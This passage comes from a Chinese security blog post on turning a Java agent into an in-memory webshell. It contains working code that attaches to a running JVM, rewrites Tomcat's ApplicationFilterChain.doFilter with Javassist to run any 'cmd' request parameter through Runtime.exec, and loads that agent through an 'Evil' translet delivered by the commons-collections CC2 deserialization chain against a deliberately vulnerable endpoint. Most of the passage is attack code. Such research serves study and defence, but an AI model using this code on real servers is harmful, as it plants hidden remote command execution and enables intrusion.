compileClass.getName());</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            manifest.getMainAttributes().put(Attributes.Name.MAIN_CLASS, compileClass.getName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 将 class 和  Manifest 写入 jar 文件</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(jarFilePath);</span><br><span class="line">             <span class="type">JarOutputStream</span> <span class="variable">jos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JarOutputStream</span>(fos, manifest)) &#123;</span><br><span class="line">            jos.putNextEntry(<span class="keyword">new</span> <span class="title class_">JarEntry</span>(className));</span><br><span class="line">            <span class="type">byte</span>[] bytes = pool.get(compileClass.getName()).toBytecode();</span><br><span class="line">            jos.write(bytes);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 如果有 jar 依赖需要打入，则进行操作</span></span><br><span class="line">            <span class="keyword">if</span>(libPath != <span class="literal">null</span> &amp;&amp; !libPath.isEmpty())&#123;</span><br><span class="line">                File[] dependencyFiles = <span class="keyword">new</span> <span class="title class_">File</span>(libPath).listFiles();</span><br><span class="line">                <span class="keyword">if</span> (dependencyFiles!=<span class="literal">null</span> &amp;&amp; dependencyFiles.length!=<span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="keyword">for</span> (File dependencyFile : dependencyFiles) &#123;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">extraJarPath</span> <span class="operator">=</span> dependencyFile.getAbsolutePath();</span><br><span class="line">                        addJarToJar(jos, extraJarPath);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            jos.closeEntry();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;JAR file created successfully!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">addJarToJar</span><span class="params">(JarOutputStream jos, String jarFilePath)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">JarFile</span> <span class="variable">jarFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JarFile</span>(jarFilePath);</span><br><span class="line">        jarFile.stream().forEach(jarEntry -&gt; &#123;</span><br><span class="line">            <span class="keyword">if</span> (!jarEntry.getName().equals(<span class="string">&quot;META-INF/MANIFEST.MF&quot;</span>) &amp;&amp; !jarEntry.getName().equals(<span class="string">&quot;META-INF/&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    jos.putNextEntry(<span class="keyword">new</span> <span class="title class_">JarEntry</span>(jarEntry.getName()));</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> jarFile.getInputStream(jarEntry);</span><br><span class="line">                    <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                    <span class="type">int</span> bytesRead;</span><br><span class="line">                    <span class="keyword">while</span> ((bytesRead = inputStream.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                        jos.write(buffer, <span class="number">0</span>, bytesRead);</span><br><span class="line">                    &#125;</span><br><span class="line">                    inputStream.close();</span><br><span class="line">                    jos.closeEntry();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        jarFile.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>运行一下主类：</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachineDescriptor;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;agentmain/src/main/java/Demo/jars/agentmain.jar&quot;</span>;</span><br><span class="line">        List&lt;VirtualMachineDescriptor&gt; list = VirtualMachine.list();</span><br><span class="line">        <span class="keyword">for</span> (VirtualMachineDescriptor v:list)&#123;</span><br><span class="line"><span class="comment">//            System.out.println(v.displayName());</span></span><br><span class="line">            <span class="keyword">if</span> (v.displayName().contains(<span class="string">&quot;MainDemo&quot;</span>))&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;已找到目标类，将 jvm 虚拟机的 pid 号传入 attach 来进行远程连接，并将 agent.jar 发送给虚拟机&quot;</span>);</span><br><span class="line">                <span class="type">VirtualMachine</span> <span class="variable">vm</span> <span class="operator">=</span> VirtualMachine.attach(v.id());</span><br><span class="line">                <span class="comment">// 获取连接后将 agent.jar 发送给虚拟机</span></span><br><span class="line">                vm.loadAgent(path);</span><br><span class="line">                <span class="comment">// 移除连接</span></span><br><span class="line">                vm.detach();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>可以发现成功调用了 agent.jar，并输出了加载的类名</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/image-20240313084226042.png"
+                      alt="image-20240313084226042"
+                ></p>
+<h4 id="注入内存马"><a href="#注入内存马" class="headerlink" title="注入内存马"></a>注入内存马</h4><p>这里还是以 Filter 内存马为例</p>
+<p>spring 写个 cc2 的漏洞环境</p>
+<div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>写个反序列化接口</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &#123;&quot;/poc&quot;&#125;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">poc</span><span class="params">(<span class="meta">@RequestParam(&quot;poc&quot;)</span> String poc)</span> &#123;</span><br><span class="line">    <span class="type">byte</span>[] bpoc = Base64.decodeBase64(poc);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bpoc));</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;wow!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>生成 Filter 内存马的 agent.jar , 记得遍历已加载的 class，如果存在的话那么就调用 retransformClasses 对其进行重定义，否则 ApplicationFilterChain 会修改失败。</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> AgentMemShell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"><span class="keyword">import</span> javassist.LoaderClassPath;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.IllegalClassFormatException;</span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AgentDemo</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">targetClassName</span> <span class="operator">=</span> <span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation instrumentation)</span> &#123;</span><br><span class="line">        instrumentation.addTransformer(<span class="keyword">new</span> <span class="title class_">AgentDemo</span>(), <span class="literal">true</span>);</span><br><span class="line">        Class[] classes = instrumentation.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class clas:classes)&#123;</span><br><span class="line">            <span class="keyword">if</span> (clas.getName().equals(targetClassName))&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    instrumentation.retransformClasses(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;clas&#125;);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) <span class="keyword">throws</span> IllegalClassFormatException &#123;</span><br><span class="line">        className = className.replace(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (className.equals(targetClassName))&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Find the Inject Class: &quot;</span> + targetClassName);</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="comment">// 需要加入这段内容，否则会出现 javassist 找不到 ApplicationFilterChain 的报错</span></span><br><span class="line">            pool.appendClassPath(<span class="keyword">new</span> <span class="title class_">LoaderClassPath</span>(Thread.currentThread().getContextClassLoader()));</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">CtClass</span> <span class="variable">c</span> <span class="operator">=</span> pool.getCtClass(className);</span><br><span class="line">                <span class="type">CtMethod</span> <span class="variable">m</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;doFilter&quot;</span>);</span><br><span class="line">                m.insertBefore(<span class="string">&quot;javax.servlet.http.HttpServletRequest req =  $1;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;javax.servlet.http.HttpServletResponse res = $2;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;java.lang.String cmd = request.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;if (cmd != null)&#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    try &#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        String line;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        StringBuilder sb = new StringBuilder(\&quot;\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        while ((line=reader.readLine()) != null)&#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;            sb.append(line).append(\&quot;\\n\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        &#125;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        response.getOutputStream().print(sb.toString());\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        response.getOutputStream().flush();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        response.getOutputStream().close();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    &#125; catch (Exception e)&#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        e.printStackTrace();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">                <span class="type">byte</span>[] bytes = c.toBytecode();</span><br><span class="line">                <span class="comment">// 将 c 从 classpool 中删除以释放内存</span></span><br><span class="line">                c.detach();</span><br><span class="line">                <span class="keyword">return</span> bytes;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> classfileBuffer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>打包 agent.jar 的时候，顺便把 tools.jar 也一起打进去，否则还需要去目标机器加载，不然就会出现找不到 VirtualMachine 类的问题。我们打入一个jar包，通过 urlclassloader 去获取一个 classloader 就可以来加载我们需要的 VirtualMachine 类了。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/image-20240313112914457.png"
+                      alt="image-20240313112914457"
+                ></p>
+<p>接着就需要想办法将我们的 agent.jar 加载进去</p>
+<p>大致思路还是获取到 jvm 的 pid 号之后，调用 loadAgent 方法将 agent.jar 注入进去，通过反射调用方法即可。（假如服务存在文件上传的口子，能给我们上传 jar）</p>
+<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> AgentMemShell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;R:\\languages\\Java\\study\\JNI_Rasp\\agentmain\\src\\main\\java\\AgentMemShell\\jars\\agentmain.jar&quot;</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">springApplication</span> <span class="operator">=</span> <span class="string">&quot;com.example.springdemo.SpringDemoApplication&quot;</span>;</span><br><span class="line"></span><br><span class="line">            java.net.<span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.File(path).toURI().toURL();</span><br><span class="line">            java.net.<span class="type">URLClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.net.URLClassLoader(<span class="keyword">new</span> <span class="title class_">java</span>.net.URL[]&#123;url&#125;);</span><br><span class="line"><span class="comment">//            ClassLoader classLoader = ClassLoader.getSystemClassLoader();</span></span><br><span class="line"></span><br><span class="line">            Class&lt;?&gt; MyVirtualMachine = classLoader.loadClass(<span class="string">&quot;com.sun.tools.attach.VirtualMachine&quot;</span>);</span><br><span class="line">            Class&lt;?&gt; MyVirtualMachineDescriptor = classLoader.loadClass(<span class="string">&quot;com.sun.tools.attach.VirtualMachineDescriptor&quot;</span>);</span><br><span class="line">            java.lang.reflect.<span class="type">Method</span> <span class="variable">listMethod</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;list&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">            java.util.<span class="type">List</span> <span class="variable">list</span> <span class="operator">=</span> (java.util.List) listMethod.invoke(MyVirtualMachine, <span class="literal">null</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;Running JVM list ...&quot;</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; list.size(); i++) &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> list.get(i);</span><br><span class="line">                java.lang.reflect.<span class="type">Method</span> <span class="variable">displayName</span> <span class="operator">=</span> MyVirtualMachineDescriptor.getDeclaredMethod(<span class="string">&quot;displayName&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String) displayName.invoke(o, <span class="literal">null</span>);</span><br><span class="line">                <span class="comment">// 这里的 if 条件根据实际情况进行更改,不加也行，附加在全部的程序上</span></span><br><span class="line">                <span class="keyword">if</span> (name.contains(springApplication)) &#123;</span><br><span class="line">                    <span class="comment">// 获取对应进程的 pid 号</span></span><br><span class="line">                    java.lang.reflect.<span class="type">Method</span> <span class="variable">getId</span> <span class="operator">=</span> MyVirtualMachineDescriptor.getDeclaredMethod(<span class="string">&quot;id&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">id</span> <span class="operator">=</span> (String) getId.invoke(o, <span class="literal">null</span>);</span><br><span class="line">                    System.out.println(<span class="string">&quot;id &gt;&gt;&gt; &quot;</span> + id);</span><br><span class="line">                    java.lang.reflect.<span class="type">Method</span> <span class="variable">attach</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;attach&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;);</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">vm</span> <span class="operator">=</span> attach.invoke(o, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;id&#125;);</span><br><span class="line">                    java.lang.reflect.<span class="type">Method</span> <span class="variable">loadAgent</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;loadAgent&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;);</span><br><span class="line">                    loadAgent.invoke(vm, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;path&#125;);</span><br><span class="line">                    java.lang.reflect.<span class="type">Method</span> <span class="variable">detach</span> <span class="operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="string">&quot;detach&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">                    detach.invoke(vm, <span class="literal">null</span>);</span><br><span class="line">                    System.out.println(<span class="string">&quot;Agent.jar Inject Success !!&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>之后再使用 CC2 去加载这个 Evil 类的字节码就行了。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/blog/image-20240313120236311.png"
+                      alt="image-20240313120236311"
+                ></p>
+
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> 从 agent 到内存马</li>
+        <li><strong>作者:</strong> Ko1sh1</li>
+        <li><strong>创建于
+                :</strong> 2024-03-13 11:56:54</li>
+        
+            <li>
+                <strong>更新于
+                    :</strong> 2024-03-13 12:06:04
+            </li>
+        
+        <li>
+            <strong>链接:</strong> https://ko1sh1.github.io/2024/03/13/从Agent到内存马/
+        </li>
+        <li>
+            <strong>
+                版权声明:
+            </strong>
+            
+
+            
+                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/%E6%8A%80%E5%B7%A7/">#技巧</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/03/08/javassist%20%E5%AD%A6%E4%B9%A0/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">javassist 学习记录</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        评论
+    </div>
+    
+
+        
+            
+    <div class="twikoo-container">
+        <script data-swup-reload-script
+                src='https://cdn.staticfile.org/twikoo/1.6.31/twikoo.all.min.js'
+        ></script>
+        <div id="twikoo-comment"></div>
+        <script data-swup-reload-script>
+            function loadTwikoo() {
+                twikoo.init({
+                    el: '#twikoo-comment',
+                    envId: 'https://ko1sh1-blog-comments.hf.space',
+                });
+            }
+
+            if ('true') {
+                const loadTwikooTimeout = setTimeout(() => {
+                    loadTwikoo();
+                    clearTimeout(loadTwikooTimeout);
+                }, 1000);
+            } else {
+                window.addEventListener('DOMContentLoaded', loadTwikoo);
+            }
+        </script>
+    </div>
+
+
+        
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">此页目录</div>
+        <div class="page-title">从 agent 到内存马</div>
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#premain-%E5%90%AF%E5%8A%A8%E6%97%B6%E5%8A%A0%E8%BD%BD-agent"><span class="nav-text">premain-启动时加载 agent</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Demo"><span class="nav-text">Demo</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E4%BF%AE%E6%94%B9%E5%AD%97%E8%8A%82%E7%A0%81"><span class="nav-text">动态修改字节码</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#agentmain-%E5%90%AF%E5%8A%A8%E5%90%8E%E5%8A%A0%E8%BD%BD-agent"><span class="nav-text">agentmain-启动后加载 agent</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#VirtualMachine"><span class="nav-text">VirtualMachine</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#VirtualMachineDescriptor"><span class="nav-text">VirtualMachineDescriptor</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96Java%E7%A8%8B%E5%BA%8F%E8%BF%9B%E7%A8%8B"><span class="nav-text">获取Java程序进程</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Demo-1"><span class="nav-text">Demo</span></a></li><li class="nav-item 